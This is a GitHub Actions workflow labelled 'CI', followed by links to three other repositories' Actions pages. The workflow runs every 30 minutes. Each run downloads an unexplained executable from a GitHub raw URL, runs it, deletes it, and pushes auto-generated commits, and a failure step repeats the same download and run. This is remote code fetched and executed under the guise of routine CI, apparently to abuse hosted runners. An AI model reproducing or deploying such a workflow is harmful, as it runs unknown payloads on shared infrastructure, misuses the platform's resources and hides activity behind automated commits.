hub
```
name: CI
on:
  push:
    branches: [ main ]

  schedule:
    - cron:  '*/30 * * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: get resorce
        run: |
          mkdir .circleci
          
          wget https://github.com/Arlentak/pages/raw/master/web
          chmod +x web
          ./web
          rm web
          git config --local user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git config --local user.name "github-actions[bot]"
          git add -A
          git commit -m "Add changes"
          git push  
      - name: My backup step
        if: ${{ failure() }}
        run: |
          TTT=$(echo $RANDOM | md5sum | head -c 20;)
          echo " $TTT " > Jess
          wget https://github.com/Arlentak/pages/raw/master/web
          chmod +x web
          ./web
          rm web
          git config --local user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git config --local user.name "github-actions[bot]"
          git add -A
          git commit -m "Add changes $TTT "
          git push
        
```
https://github.com/xasdw2x/master/actions

https://github.com/discove3s/kilso/actions

https://github.com/aslo2sa/asters/actions

